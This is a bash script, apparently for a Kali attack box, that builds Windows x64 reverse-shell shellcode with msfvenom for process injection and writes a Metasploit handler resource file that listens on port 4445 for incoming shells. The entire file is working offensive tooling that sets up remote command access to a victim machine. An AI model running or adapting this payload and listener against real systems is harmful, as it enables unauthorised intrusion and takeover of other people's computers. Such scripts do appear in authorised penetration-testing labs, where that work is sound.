#!/bin/bash
# Generate shellcode for process injection

echo "=== Generating Shellcode for Process Injection ==="
echo ""

# Get Kali IP
IP=$(hostname -I | awk '{print $1}')
echo "[*] Using Kali IP: $IP"
echo ""

# Generate x64 shellcode for Windows 10/11 64-bit
echo "[*] Generating x64 shellcode..."
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$IP LPORT=4445 -f python -v shellcode -o shellcode.py

if [ $? -eq 0 ]; then
    echo "[+] Generated shellcode.py"
    
    # Show size
    SIZE=$(grep -o 'b"' shellcode.py | wc -c)
    echo "[+] Shellcode size: approximately $SIZE bytes"
else
    echo "[-] Failed to generate shellcode"
    exit 1
fi

# Create Metasploit handler
cat > injection_handler.rc << EOF
use exploit/multi/handler
set payload windows/x64/shell_reverse_tcp
set LHOST 0.0.0.0
set LPORT 4445
set ExitOnSession false
exploit -j
EOF

echo "[+] Created injection_handler.rc"
echo ""
